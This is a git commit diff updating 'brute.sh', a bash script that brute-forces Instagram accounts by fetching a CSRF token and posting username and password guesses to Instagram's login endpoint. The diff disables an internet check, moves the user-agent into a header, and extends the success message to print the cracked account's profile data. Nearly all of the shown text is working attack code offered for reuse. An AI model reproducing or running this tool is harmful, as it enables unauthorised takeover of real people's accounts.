4ffe83e8ac0b6c76af58c729d748527d6871b884
Zan <41676687+wannabeee@users.noreply.github.com>
2019-08-19 22:06:28 -1200

    Update brute.sh

--- brute.sh
+++ brute.sh
@@ -1,11 +1,11 @@
 #!/bin/bash
 #author         : ./Lolz
-#release        : Jum'at 5 juli 2k19    
+#release        : Jum'at 5 juli 2k19
 #visit          : https://noolep.net
 #thanks to      : JavaGhost - Bashid.org - 407AEX
 #recode tinggal recode aja okeh?, tapi cantumin source Y tolol h3h3
 
-#color
+#color(bold)
 red='\e[1;31m'
 green='\e[1;32m'
 yellow='\e[1;33m'
@@ -15,16 +15,16 @@ cyan='\e[1;36m'
 white='\e[1;37m'
 
 #connections
-wget -q --tries=10 --timeout=20 --spider http://google.com
-echo "test your internet connections..."
-if [[ $? -eq 0 ]]; then
-        echo -e "status [${yellow}200 OK${white}]\nplease wait..."
-        sleep 2
-        clear
-else
-        echo "internet connections not found"
-        exit
-fi
+#wget -q --tries=10 --timeout=20 --spider http://google.com
+#echo "test your internet connections..."
+#if [[ $? -eq 0 ]]; then
+#        echo -e "status [${yellow}200 OK${white}]\nplease wait..."
+#        sleep 2
+#        ckear
+#else
+#        echo "internet connections not found"
+#        exit
+#fi
 
 #dependencies
 dependencies=( "jq" "curl" )
@@ -54,21 +54,21 @@ echo "Start cracking..."
 #start_brute
 token=$(curl -s -L -i "https://www.instagram.com/accounts/login/ajax/" | grep -o "csrftoken=.*" | cut -d "=" -f2 | cut -d ";" -f1)
 function brute(){
-    url=$(curl -s --user-agent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36" -X POST "https://www.instagram.com/accounts/login/ajax/" \
+    url=$(curl -s -X POST "https://www.instagram.com/accounts/login/ajax/" \
             -H "cookie: csrftoken=${token}" \
             -H "origin: https://www.instagram.com" \
             -H "referer: https://www.instagram.com/accounts/login/" \
+            -H "user-agent: Mozilla/5.0 (Windows NT 10.0; Win32; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36" \
             -H "x-csrftoken: ${token}" \
             -H "x-requested-with: XMLHttpRequest" \
             -d "username=${i}&password=${pass}&intent")
             login=$(echo $url | grep -o "authenticated.*" | cut -d ":" -f2 | cut -d "," -f1)
             if [[ $login =~ "true" ]]; then
-                    echo -e "[${green}+${white}] found ${yellow}(@$i | $pass${yellow})${white}"
-                    sleep 5
+                    echo -e "[${green}+${white}] ${yellow}get it! ${blue}[${white}@$i - $pass${blue}] ${white}- with: "$(curl -s "https://www.instagram.com/$i/" | grep "<meta content=" | cut -d '"' -f2 | cut -d "," -f1)
                 elif [[ $login =~ "false" ]]; then
                             echo -e "[${red}!${white}] @$i - ${red}failed to crack${white}"
                     elif [[ $url =~ "checkpoint_required" ]]; then
-                            echo -e "[${cyan}?${white}] ${cyan}@$i ${white}: ${yellow}checkpoint${white}"
+                            echo -e "[${cyan}?${white}] @$i ${white}: ${green}checkpoint${white}"
 
             fi
 }
